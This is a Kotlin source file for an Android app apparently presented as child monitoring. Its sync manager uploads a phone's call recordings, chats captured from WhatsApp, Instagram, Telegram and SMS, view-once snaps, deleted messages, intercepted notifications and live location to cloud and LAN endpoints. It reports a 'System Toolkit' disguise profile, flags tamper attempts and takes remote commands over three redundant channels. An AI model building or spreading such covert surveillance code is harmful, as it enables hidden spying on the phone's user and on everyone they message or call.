package com.vyra.kids.core

import android.content.Context
import android.os.Handler
import android.os.Looper
import android.util.Log
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.io.File

/**
 * Unified Cloud & LAN Sync Manager.
 * Operates purely on Supabase REST/Storage + Same-Wi-Fi SSE Stream + Local Offline Vault.
 * Firebase has been completely removed to provide zero background overhead and zero quota lockups.
 */
class FirebaseSyncManager private constructor(private val context: Context) {

    private val childId: String
        get() = PrefsManager.getInstance(context).pairingCode.ifEmpty { "child_1" }

    private val supabaseSync: SupabaseSyncManager by lazy { SupabaseSyncManager.getInstance(context) }
    private val localVault: LocalDataManager by lazy { LocalDataManager.getInstance(context) }
    private val lanServer: LocalLanSyncServer by lazy { LocalLanSyncServer.getInstance(context) }

    private var hasBackfilled = false

    fun backfillFromLocalVault() {
        if (hasBackfilled || !supabaseSync.isConfigured) return
        hasBackfilled = true
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val chats = localVault.getChats()
                for (chat in chats) {
                    supabaseSync.syncRecord("chats", chat)
                }
                val calls = localVault.getCalls()
                for (call in calls) {
                    supabaseSync.syncRecord("calls", call)
                }
                val notifs = localVault.getNotifications()
                for (notif in notifs) {
                    supabaseSync.syncRecord("notifications", notif)
                }
                Log.i(AppConstants.TAG, "Backfilled ${chats.size} chats, ${calls.size} calls, ${notifs.size} notifs from local vault to Supabase")
            } catch (e: Exception) {
                Log.e(AppConstants.TAG, "Error backfilling from local vault", e)
            }
        }
    }

    companion object {
        @Volatile
        private var instance: FirebaseSyncManager? = null

        fun getInstance(context: Context): FirebaseSyncManager {
            return instance ?: synchronized(this) {
                instance ?: FirebaseSyncManager(context.applicationContext).also {
                    instance = it
                    it.backfillFromLocalVault()
                }
            }
        }
    }

    /**
     * Updates live device telemetry (battery, online status, disguise profile, location)
     */
    fun syncDeviceStatus(
        batteryLevel: Int? = null,
        isOnline: Boolean = true,
        disguise: String = "System Toolkit",
        location: String = "Live GPS Active",
        isScreenOn: Boolean? = null
    ) {
        try {
            val dynamicModel = "${android.os.Build.MANUFACTURER.replaceFirstChar { it.uppercase() }} ${android.os.Build.MODEL}"
            val realBattery = batteryLevel ?: run {
                val bm = context.getSystemService(Context.BATTERY_SERVICE) as? android.os.BatteryManager
                val cap = bm?.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY) ?: -1
                if (cap in 1..100) {
                    cap
                } else {
                    val batteryIntent = context.registerReceiver(null, android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED))
                    val level = batteryIntent?.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1) ?: -1
                    val scale = batteryIntent?.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1) ?: -1
                    if (level >= 0 && scale > 0) ((level * 100) / scale) else 50
                }
            }
            val pm = context.getSystemService(Context.POWER_SERVICE) as? android.os.PowerManager
            val screenInteractive = isScreenOn ?: (pm?.isInteractive ?: true)

            val statusPayload = hashMapOf<String, Any>(
                "id" to childId,
                "childId" to childId,
                "deviceModel" to dynamicModel,
                "batteryLevel" to realBattery,
                "isOnline" to isOnline,
                "isScreenOn" to screenInteractive,
                "selectedDisguise" to disguise,
                "locationAddress" to location,
                "lastSeenMs" to System.currentTimeMillis()
            )

            localVault.saveStatus(statusPayload)
            supabaseSync.syncRecord("devices", statusPayload)
            lanServer.broadcastLiveEvent("status", statusPayload)
            ScreenTimeManager.syncScreenTimeToSupabase(context)
            Log.d(AppConstants.TAG, "Synced device status (battery: $realBattery%, online: $isOnline)")
        } catch (e: Exception) {
            Log.e(AppConstants.TAG, "Error in syncDeviceStatus", e)
        }
    }

    /**
     * Uploads call recording audio to Supabase Storage and records metadata in database + local vault
     */
    fun syncCallRecord(
        callId: String,
        contactName: String,
        phoneNumber: String,
        callType: String,
        durationSeconds: Long,
        audioFile: File?,
        isTamperAttemptDetected: Boolean = false,
        callDateMs: Long? = null,
        onComplete: ((Boolean) -> Unit)? = null
    ) {
        try {
            if (audioFile != null && audioFile.exists() && audioFile.length() > 0) {
                val remotePath = "$childId/${audioFile.name}"
                supabaseSync.uploadFile("recordings", remotePath, audioFile, "audio/mp4") { uploadedUrl ->
                    val finalUrl = uploadedUrl ?: audioFile.name
                    saveCallRecordInternal(
                        callId, contactName, phoneNumber, callType,
                        durationSeconds, finalUrl, isTamperAttemptDetected, callDateMs, onComplete
                    )
                }
            } else {
                saveCallRecordInternal(
                    callId, contactName, phoneNumber, callType,
                    durationSeconds, "", isTamperAttemptDetected, callDateMs, onComplete
                )
            }
        } catch (e: Exception) {
            Log.e(AppConstants.TAG, "Error in syncCallRecord", e)
            onComplete?.invoke(false)
        }
    }

    private fun saveCallRecordInternal(
        callId: String,
        contactName: String,
        phoneNumber: String,
        callType: String,
        durationSeconds: Long,
        recordingUrl: String,
        isTamperAttemptDetected: Boolean,
        callDateMs: Long?,
        onComplete: ((Boolean) -> Unit)?
    ) {
        val callPayload = hashMapOf<String, Any>(
            "id" to callId,
            "childId" to childId,
            "contactName" to contactName,
            "phoneNumber" to phoneNumber,
            "callType" to callType,
            "durationSeconds" to durationSeconds,
            "recordingUrl" to recordingUrl,
            "isTamperAttemptDetected" to isTamperAttemptDetected,
            "timestampMs" to (callDateMs ?: System.currentTimeMillis())
        )

        localVault.saveCall(callPayload)
        supabaseSync.syncRecord("calls", callPayload)
        lanServer.broadcastLiveEvent("call", callPayload)
        onComplete?.invoke(true)
    }

    /**
     * Uploads captured 1-view snaps, voice notes, or social photos/videos to Supabase Storage
     * and records message metadata with OCR/transcription text into Supabase database + local vault
     */
    fun uploadMediaAndSyncChatMessage(
        msgId: String,
        app: String,
        sender: String,
        text: String,
        mediaFile: File,
        mediaType: String = "snap",
        isViewOnce: Boolean = true,
        isIncoming: Boolean = true,
        isDeletedBySender: Boolean = false,
        isWatchlistTarget: Boolean = false,
        ocrText: String? = null,
        voiceNoteDurationSeconds: Int = 0
    ) {
        try {
            val fullText = if (!ocrText.isNullOrBlank()) {
                "$text\n📝 [Snap Text]: \"$ocrText\""
            } else {
                text
            }

            if (mediaFile.exists() && mediaFile.length() > 0) {
                val bucket = if (mediaType == "audio") "recordings" else "snaps"
                val mimeType = when {
                    mediaType == "audio" -> {
                        when {
                            mediaFile.name.endsWith(".opus", ignoreCase = true) -> "audio/ogg"
                            mediaFile.name.endsWith(".m4a", ignoreCase = true) -> "audio/mp4"
                            mediaFile.name.endsWith(".mp3", ignoreCase = true) -> "audio/mpeg"
                            else -> "audio/ogg"
                        }
                    }
                    mediaType == "video" || mediaFile.name.endsWith(".mp4", ignoreCase = true) -> "video/mp4"
                    else -> "image/jpeg"
                }

                val remotePath = "$childId/${mediaFile.name}"
                supabaseSync.uploadFile(bucket, remotePath, mediaFile, mimeType) { publicUrl ->
                    val voiceUrl = if (mediaType == "audio") (publicUrl ?: "") else ""
                    val chatPayload = hashMapOf<String, Any>(
                        "id" to msgId,
                        "childId" to childId,
                        "app" to app,
                        "sender" to sender,
                        "text" to fullText,
                        "mediaUrl" to (publicUrl ?: ""),
                        "mediaType" to mediaType,
                        "voiceNoteUrl" to voiceUrl,
                        "voiceNoteDurationSeconds" to voiceNoteDurationSeconds,
                        "isViewOnce" to isViewOnce,
                        "isIncoming" to isIncoming,
                        "isDeletedBySender" to isDeletedBySender,
                        "isWatchlistTarget" to isWatchlistTarget,
                        "timestampMs" to System.currentTimeMillis()
                    )

                    localVault.saveChat(chatPayload)
                    supabaseSync.syncRecord("chats", chatPayload)
                    lanServer.broadcastLiveEvent("chat", chatPayload)
                }
            } else {
                syncChatMessage(msgId, app, sender, fullText, isDeletedBySender, isWatchlistTarget)
            }
        } catch (e: Exception) {
            Log.e(AppConstants.TAG, "Error in uploadMediaAndSyncChatMessage", e)
            syncChatMessage(msgId, app, sender, text, isDeletedBySender, isWatchlistTarget)
        }
    }

    /**
     * Syncs captured social chat messages (WhatsApp, Instagram, Telegram, SMS, etc.)
     */
    fun syncChatMessage(
        msgId: String,
        app: String,
        sender: String,
        text: String,
        isDeletedBySender: Boolean = false,
        isWatchlistTarget: Boolean = false,
        mediaUrl: String? = null,
        mediaType: String? = null,
        voiceNoteUrl: String? = null,
        voiceNoteDurationSeconds: Int = 0,
        isViewOnce: Boolean = false
    ) {
        try {
            val isIncoming = !sender.contains("Aryan", ignoreCase = true) && !sender.contains("Child", ignoreCase = true)
            val chatPayload = hashMapOf<String, Any>(
                "id" to msgId,
                "childId" to childId,
                "app" to app,
                "sender" to sender,
                "text" to text,
                "isIncoming" to isIncoming,
                "isDeletedBySender" to isDeletedBySender,
                "isWatchlistTarget" to isWatchlistTarget,
                "timestampMs" to System.currentTimeMillis()
            )
            if (!mediaUrl.isNullOrBlank()) {
                chatPayload["mediaUrl"] = mediaUrl
            }
            if (!mediaType.isNullOrBlank()) {
                chatPayload["mediaType"] = mediaType
            }
            val voice = voiceNoteUrl ?: if (mediaType == "audio") mediaUrl else null
            if (!voice.isNullOrBlank()) {
                chatPayload["voiceNoteUrl"] = voice
            }
            if (voiceNoteDurationSeconds > 0) {
                chatPayload["voiceNoteDurationSeconds"] = voiceNoteDurationSeconds
            }
            if (isViewOnce) {
                chatPayload["isViewOnce"] = true
            }

            localVault.saveChat(chatPayload)
            supabaseSync.syncRecord("chats", chatPayload)
            lanServer.broadcastLiveEvent("chat", chatPayload)
            Log.d(AppConstants.TAG, "Synced chat message: [$app] $sender: $text")
        } catch (e: Exception) {
            Log.e(AppConstants.TAG, "Error in syncChatMessage", e)
        }
    }

    /**
     * Syncs intercepted notification
     */
    fun syncNotification(
        itemId: String,
        packageName: String,
        appName: String,
        title: String,
        text: String,
        isImportant: Boolean = false
    ) {
        try {
            val notifPayload = hashMapOf<String, Any>(
                "id" to itemId,
                "childId" to childId,
                "packageName" to packageName,
                "appName" to appName,
                "title" to title,
                "text" to text,
                "isImportant" to isImportant,
                "timestampMs" to System.currentTimeMillis()
            )

            localVault.saveNotification(notifPayload)
            supabaseSync.syncRecord("notifications", notifPayload)
            lanServer.broadcastLiveEvent("notification", notifPayload)
        } catch (e: Exception) {
            Log.e(AppConstants.TAG, "Error in syncNotification", e)
        }
    }

    /**
     * Listens for real-time remote commands sent by Parent.
     *
     * CHANNEL 1 (fastest): Socket.IO persistent connection to Render backend → < 100 ms
     * CHANNEL 2 (backup):  Supabase Realtime WebSocket → instant delivery (< 200 ms)
     * CHANNEL 3 (safety):  REST poll every 60 s → catches commands if both WS channels drop
     */
    fun startListeningToCommands(onCommandReceived: (action: String, payload: Map<String, Any>) -> Unit) {
        // 1. Socket.IO — primary real-time channel (Render backend)
        try {
            RenderSocketManager.getInstance(context).connect(childId, onCommandReceived)
            Log.i(AppConstants.TAG, "Socket.IO command listener started for childId=$childId")
        } catch (e: Exception) {
            Log.e(AppConstants.TAG, "Failed to start Socket.IO listener", e)
        }

        try {
            // 2. Supabase Realtime WebSocket (instant command delivery)
            supabaseSync.subscribeToCommands(childId, onCommandReceived)
            Log.i(AppConstants.TAG, "Supabase Realtime: Command subscription started for $childId")

            // 3. REST poll every 60 s (safety-net for any missed commands)
            val handler = Handler(Looper.getMainLooper())
            val pollRunnable = object : Runnable {
                override fun run() {
                    supabaseSync.pollPendingCommands(childId, onCommandReceived)
                    handler.postDelayed(this, 60_000L)
                }
            }
            handler.postDelayed(pollRunnable, 5_000L) // first poll after 5 s to catch any missed on startup
        } catch (e: Exception) {
            Log.e(AppConstants.TAG, "Error starting command listener", e)
        }
    }
}

